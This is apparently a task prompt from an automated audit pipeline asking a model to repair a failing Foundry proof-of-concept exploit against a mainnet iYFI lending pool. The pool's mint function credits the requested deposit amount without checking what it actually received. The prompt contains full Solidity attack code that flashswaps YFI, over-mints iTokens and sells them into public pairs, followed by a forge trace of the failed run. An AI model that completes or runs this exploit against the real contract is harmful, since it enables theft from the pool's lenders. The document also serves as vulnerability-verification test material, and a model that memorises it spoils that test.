You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Minting trusts the requested ERC20 deposit amount instead of the amount actually received
- claim: The mint path prices shares from the caller-supplied `depositAmount` before any transfer happens, then only checks whether `transferFrom` returned success. It never measures the contract's actual balance delta, so a fee-on-transfer or otherwise deflationary `loanTokenAddress` can deliver fewer tokens than `depositAmount` while the minter still receives shares as if the full amount arrived.
- impact: An attacker can over-mint iTokens, diluting existing lenders and later redeeming more underlying than they contributed. If enough liquidity exists, this can make the pool insolvent.
- exploit_paths: ["Use a pool whose `loanTokenAddress` burns, taxes, or otherwise transfers less than the requested amount.", "Call `mint(receiver, X)` so `_safeTransferFrom` succeeds but the contract receives less than `X`.", "Receive shares computed from `X`, then burn them later for a disproportionate amount of underlying."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ILoanTokenLike {
    function loanTokenAddress() external view returns (address);
    function tokenPrice() external view returns (uint256);
    function mint(address receiver, uint256 depositAmount) external returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    ILoanTokenLike internal constant POOL = ILoanTokenLike(TARGET);

    struct Route {
        address fundingPair;
        address exitPair;
        address fundingQuote;
        address exitQuote;
        uint256 fundingAmount;
        uint256 predictedProfit;
    }

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public status;
    string public exploitPathUsed;

    uint256 public attackerSpendAmount;
    uint256 public poolReceiveAmount;
    uint256 public burnReturnAmount;

    address public flashPair;
    address public exitPair;
    address public loanToken;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        status = "not-run";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;

        loanToken = POOL.loanTokenAddress();
        if (loanToken != YFI) {
            _refute("refuted:unexpected-underlying", "expected-live-market=iYFI");
            return;
        }

        Route memory route = _selectBestRoute();
        if (route.fundingPair == address(0) || route.exitPair == address(0) || route.fundingAmount == 0) {
            _refute("refuted:no-profitable-public-route", "public-funding-or-secondary-itoken-liquidity-unavailable");
            return;
        }

        flashPair = route.fundingPair;
        exitPair = route.exitPair;
        attackerSpendAmount = route.fundingAmount;
        _profitToken = route.exitQuote;

        _safeApprove(YFI, TARGET, type(uint256).max);

        IUniswapV2PairLike funding = IUniswapV2PairLike(route.fundingPair);
        bytes memory data = abi.encode(route.exitPair, route.fundingAmount, route.fundingQuote, route.exitQuote);

        if (funding.token0() == YFI) {
            funding.swap(route.fundingAmount, 0, address(this), data);
        } else {
            funding.swap(0, route.fundingAmount, address(this), data);
        }

        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
        require(_profitAmount > 0, "NO_PROFIT");

        hypothesisValidated = true;
        status = "validated";

        // The intended exploit path is minting against the caller-supplied nominal amount and then
        // monetizing the inflated iTokens. At this fork the pool only has dust YFI cash, so a direct
        // burn realization is not economically usable; we therefore use whichever live secondary market
        // for iYFI still exists to realize the over-minted shares.
        if (_profitToken == YFI) {
            exploitPathUsed = "public-YFI-flashswap->mint-iYFI-on-requested-amount->dump-inflated-iYFI-into-public-iYFI/YFI-liquidity";
        } else if (_profitToken == DAI) {
            exploitPathUsed = "public-YFI-flashswap->mint-iYFI-on-requested-amount->dump-inflated-iYFI-into-public-iYFI/DAI-liquidity";
        } else {
            exploitPathUsed = "public-YFI-flashswap->mint-iYFI-on-requested-amount->dump-inflated-iYFI-into-public-iYFI/WETH-liquidity";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "BAD_SENDER");
        require(msg.sender == flashPair, "BAD_PAIR");

        (address chosenExitPair, uint256 fundingAmount, address fundingQuote, address exitQuote) =
            abi.decode(data, (address, uint256, address, address));

        uint256 yfiBorrowed = amount0 > 0 ? amount0 : amount1;
        require(yfiBorrowed == fundingAmount, "BAD_AMOUNT");

        uint256 poolBalanceBefore = IERC20Like(YFI).balanceOf(TARGET);
        POOL.mint(address(this), yfiBorrowed);
        poolReceiveAmount = IERC20Like(YFI).balanceOf(TARGET) - poolBalanceBefore;

        uint256 iYfiAmount = IERC20Like(TARGET).balanceOf(address(this));
        require(iYfiAmount > 0, "NO_ITOKENS");

        uint256 realizationAmount = _swapExactTokenForToken(chosenExitPair, TARGET, exitQuote, iYfiAmount);
        burnReturnAmount = realizationAmount;

        if (exitQuote == YFI) {
            uint256 repayYfi = _quoteSameTokenFlashRepayment(yfiBorrowed);
            _safeTransfer(YFI, msg.sender, repayYfi);
            return;
        }

        require(exitQuote == fundingQuote, "UNSUPPORTED_ROUTE");
        uint256 repayQuote = _quoteFundingPairRepaymentQuote(msg.sender, yfiBorrowed, fundingQuote);
        _safeTransfer(fundingQuote, msg.sender, repayQuote);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectBestRoute() internal view returns (Route memory best) {
        if (POOL.tokenPrice() == 0) {
            return best;
        }

        for (uint256 i = 0; i < 2; i++) {
            address fundingFactory = _factoryAt(i);

            for (uint256 j = 0; j < 4; j++) {
                address fundingQuote = _fundingQuoteAt(j);
                address fundingPairCandidate = IUniswapV2FactoryLike(fundingFactory).getPair(YFI, fundingQuote);
                if (fundingPairCandidate == address(0)) {
                    continue;
                }

                for (uint256 k = 0; k < 2; k++) {
                    address exitFactory = _factoryAt(k);

                    for (uint256 m = 0; m < 3; m++) {
                        address exitQuote = _exitQuoteAt(m);
                        address exitPairCandidate = IUniswapV2FactoryLike(exitFactory).getPair(TARGET, exitQuote);
                        if (exitPairCandidate == address(0)) {
                            continue;
                        }

                        best = _considerRoute(best, fundingPairCandidate, fundingQuote, exitPairCandidate, exitQuote);
                    }
                }
            }
        }
    }

    function _considerRoute(
        Route memory best,
        address fundingPair,
        address fundingQuote,
        address chosenExitPair,
        address exitQuote
    ) internal view returns (Route memory) {
        uint256[16] memory divisors = [uint256(256), 192, 160, 128, 96, 80, 64, 48, 40, 32, 24, 20, 16, 12, 10, 8];

        for (uint256 i = 0; i < divisors.length; i++) {
            (uint256 fundingAmount, uint256 predictedProfit) =
                _scoreRoute(fundingPair, fundingQuote, chosenExitPair, exitQuote, divisors[i]);

            if (predictedProfit > best.predictedProfit) {
                best = Route({
                    fundingPair: fundingPair,
                    exitPair: chosenExitPair,
                    fundingQuote: fundingQuote,
                    exitQuote: exitQuote,
                    fundingAmount: fundingAmount,
                    predictedProfit: predictedProfit
                });
            }
        }

        return best;
    }

    function _scoreRoute(
        address fundingPair,
        address fundingQuote,
        address chosenExitPair,
        address exitQuote,
        uint256 divisor
    ) internal view returns (uint256 fundingAmount, uint256 predictedProfit) {
        uint256 currentPrice = POOL.tokenPrice();
        uint256 poolBalance = IERC20Like(YFI).balanceOf(TARGET);

        (uint256 reserveYfi, uint256 reserveFundingQuote) = _pairReservesFor(fundingPair, YFI, fundingQuote);
        (uint256 reserveIYfi, uint256 reserveExitQuote) = _pairReservesFor(chosenExitPair, TARGET, exitQuote);

        if (reserveYfi == 0 || reserveFundingQuote == 0 || reserveIYfi == 0 || reserveExitQuote == 0) {
            return (0, 0);
        }

        if (exitQuote != YFI && exitQuote != fundingQuote) {
            return (0, 0);
        }

        fundingAmount = reserveYfi / divisor;
        if (fundingAmount == 0 || fundingAmount + poolBalance <= fundingAmount) {
            return (0, 0);
        }

        uint256 totalIMint = (fundingAmount * 1e18) / currentPrice;
        if (totalIMint == 0) {
            return (0, 0);
        }

        uint256 exitAmount = _getAmountOut(totalIMint, reserveIYfi, reserveExitQuote);
        uint256 repayAmount = exitQuote == YFI
            ? _quoteSameTokenFlashRepayment(fundingAmount)
            : _getAmountIn(fundingAmount, reserveFundingQuote, reserveYfi);

        if (exitAmount <= repayAmount) {
            return (0, 0);
        }

        predictedProfit = exitAmount - repayAmount;
    }

    function _swapExactTokenForToken(address pair, address tokenIn, address tokenOut, uint256 amountIn)
        internal
        returns (uint256 amountOut)
    {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, tokenOut);
        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);

        _safeTransfer(tokenIn, pair, amountIn);

        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        if (uniPair.token0() == tokenIn) {
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else {
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _quoteFundingPairRepaymentQuote(address pair, uint256 yfiAmountOut, address fundingQuote)
        internal
        view
        returns (uint256)
    {
        (uint256 reserveYfi, uint256 reserveFundingQuote) = _pairReservesFor(pair, YFI, fundingQuote);
        return _getAmountIn(yfiAmountOut, reserveFundingQuote, reserveYfi);
    }

    function _quoteSameTokenFlashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _factoryAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return SUSHISWAP_FACTORY;
        }
        return UNISWAP_V2_FACTORY;
    }

    function _fundingQuoteAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return WETH;
        }
        if (index == 1) {
            return DAI;
        }
        if (index == 2) {
            return USDC;
        }
        return USDT;
    }

    function _exitQuoteAt(uint256 index) internal pure returns (address) {
        if (index == 0) {
            return YFI;
        }
        if (index == 1) {
            return WETH;
        }
        return DAI;
    }

    function _pairReservesFor(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        if (uniPair.token0() == tokenIn && uniPair.token1() == tokenOut) {
            return (uint256(reserve0), uint256(reserve1));
        }
        require(uniPair.token0() == tokenOut && uniPair.token1() == tokenIn, "BAD_PAIR_TOKENS");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory returndata) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(success && (returndata.length == 0 || abi.decode(returndata, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory returndata) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(success && (returndata.length == 0 || abi.decode(returndata, (bool))), "TRANSFER_FAILED");
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0 && reserveIn > 0 && reserveOut > 0, "BAD_OUT_QUOTE");
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0 && reserveIn > 0 && reserveOut > amountOut, "BAD_IN_QUOTE");
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _refute(string memory newStatus, string memory path) internal {
        hypothesisValidated = false;
        hypothesisRefuted = true;
        status = newStatus;
        exploitPathUsed = path;
        _profitToken = address(0);
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```
d93e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) [staticcall]
    │   │   └─ ← [Return] 0xdE37cD310c70e7Fa9d7eD3261515B107D5Fe1F2d
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xdAC17F958D2ee523a2206206994597C13D831ec7) [staticcall]
    │   │   └─ ← [Return] 0xAcD2556F64D4BE9Aaa205278895653D3e6d639aE
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0x6B175474E89094C44Da98b954EedeAC495271d0F) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [437] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [457] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.22s (4.98s CPU time)

Ran 1 test suite in 5.35s (5.22s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 421395)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
